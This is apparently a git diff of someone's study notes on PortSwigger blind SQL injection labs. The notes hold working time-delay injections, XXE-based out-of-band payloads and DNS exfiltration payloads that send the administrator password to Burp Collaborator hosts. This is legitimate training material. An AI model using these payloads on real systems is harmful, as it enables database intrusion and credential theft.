@@ -471,7 +471,8 @@ observe when condition changes to **= 'a'** we dont get the telltail response
  
 we need to iterate via intruder or via code.
 
-1. Code see:
+1. for Code see:
+> /SQLi - SQL Injection/Lab_ Blind SQL injection with conditional responses.py
 
 2. intruder:
 send request to **Intruder** and choose **Cluster Bomb**. in payload use *numbers* to 1-30 as payload 1 and *brute force* use {a-z0-9} 
@@ -482,30 +483,120 @@ in response observe most response have length of *6891* while about only few hav
 send those **requests** to comparer and copy the char value the yeilded the response (payload 2) to the specified charecter lovation in the password (payload 1)
 (a lot of wotk - coding is better...)
 
-# finished
+# Solved
 
 
-<!-- Blind SQL injection with time delays -->
+# ***2. Blind SQL injection with time delays***
 https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
 
+ The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
 
-<!-- Blind SQL injection with time delays and information retrieval -->
+> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
+
+1. use basic format to determine how many coloumns are in the current table with various time delay triggers: 
+**request5:**
+>GET /filter?category=Pets HTTP/1.1
+>Cookie: TrackingId=UZ2bVerI2nvWNdf5'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+pg_sleep(10)--; session=J4XYX9LvR5r8TI4Vl7gzz8ehGsEmQoLr
+
+we know that **SELECT pg_sleep(10)** is used by PostgreSQL and thay we have 1 field of returnd value.
+
+# lab solved
+
+
+# ***3.lab: Blind SQL injection with time delays and information retrieval***
 https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
 
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
 
-<!-- Blind SQL injection with out-of-band interaction -->
+To solve the lab, log in as the administrator user. 
+
+telltale: **time dealy**
+
+1. use payload from previous lab to confirm time delay:
+**request5:**
+>GET /filter?category=Pets HTTP/1.1
+>Cookie: TrackingId=UZ2bVerI2nvWNdf5'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+pg_sleep(10)--; session=J4XYX9LvR5r8TI4Vl7gzz8ehGsEmQoLr
+response: **time delay**
+
+<!-- from cheetsheet:
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END -->
+
+'||(SELECT CASE WHEN (SUBSTR(password,§{pass_index}§,1)='§{char}§') THEN pg_sleep(1) ELSE '' END FROM users WHERE username='administrator')||'
+
+See code in folder:
+/SQLi - SQL Injection/Lab_ Blind SQL injection with time delays.py
+
+
+# ***4.Lab: Blind SQL injection with out-of-band interaction***
 https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+ The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 
+
+**Burp colaborator:**
+mj96kitkkcyzl6et8txxik1psgyhm6.oastify.com
+
+try different payloads from the cheet sheet:
+
+> GET /filter?category=Pets HTTP/1.1
+> Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//sfbi7le89d6u9c0nb6siq3hxwo2hq6.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=lSieWhubfLdBEKLv0WAuxT1RMblaQfH9
 
 
-<!-- Blind SQL injection with out-of-band data exfiltration -->
+<!-- 
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//sfbi7le89d6u9c0nb6siq3hxwo2hq6.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+
+
+didnt work:
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.sfbi7le89d6u9c0nb6siq3hxwo2hq6.oastify.com/"> %remote;]>'),'/l') FROM dual 
+
+
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+
+copy (SELECT '') to program 'nslookup mj96kitkkcyzl6et8txxik1psgyhm6.oastify.com'
+
+
+LOAD_FILE('\\\\md36einkecszf68t2trxckvpmgsfg4.oastify.com\\a')
+SELECT ... INTO OUTFILE '\\\\md36einkecszf68t2trxckvpmgsfg4.oastify.com\a'
+
+
+Cookie: TrackingId=FHv90K7JIp9WmoMV'%3b+exec+master..xp_dirtree+'//md36einkecszf68t2trxckvpmgsfg4.oastify.com/a'--;
+
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://7v3rw355wxakxrqeke9iu5da41aryg.oastify.com/"> %remote;]>'),'/l') FROM dual
+
+%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pass_index},1)='{char}')+THENcopy+(SELECT+'')+to program+'nslookup+7v3rw355wxakxrqeke9iu5da41aryg.oastify.com+ELSE+''+END+FROM+users--
+
+
+'||(SELECT CASE WHEN (SUBSTR(password,{pass_index},1)='{char}') THEN copy (SELECT '') to program 'nslookup 7v3rw355wxakxrqeke9iu5da41aryg.oastify.com  ELSE '' END FROM users WHERE username='administrator')||'
+
+'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+copy (SELECT '') to program 'nslookup 7v3rw355wxakxrqeke9iu5da41aryg.oastify.com'--
+
+'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+copy (SELECT '') to program 'nslookup 7v3rw355wxakxrqeke9iu5da41aryg.oastify.com'-- -->
+
+
+
+# ***5. Lab: Blind SQL injection with out-of-band data exfiltration***
 https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
 
-TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+ The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
 
-x' UNION SELECT EXTRACTVALUE(
-    xmltype('
-    <?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE root [<!ENTITY remote SYSTEM "https://exploit-0ab100770308f09ac0035e9f011400f7.web-security-academy.net/exploit/"+(SELECT password FROM users WHERE username='administrator')>]> 
-    &remote
-    '),'/l') FROM dual--
-    ; session=1fmMdR7yS8HGwofR1SYnkvbWDxEogGkP
+To solve the lab, log in as the administrator user. 
+
+**Burp colaborator:**
+9nxzf2mphuebht84jn0zykpe45azyo.oastify.com
+
+try payloads from cheet sheet. enter the query to get padministrator password and use the colaborator address:
+> '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.9nxzf2mphuebht84jn0zykpe45azyo.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+**request:**
+> GET /filter?category=Gifts HTTP/1.1
+> Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.9nxzf2mphuebht84jn0zykpe45azyo.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=1syUfEJVhh2hm0I4Fb8wQyutHwd285D2
+
+**response in Burp Colaborator:**
+> The Collaborator server received a DNS lookup of type AAAA for the domain name i8i90aeaq5jj5pdpln6m.9nxzf2mphuebht84jn0zykpe45azyo.oastify.com.
+
+password:**i8i90aeaq5jj5pdpln6m**
+
+# lab solved
+
+
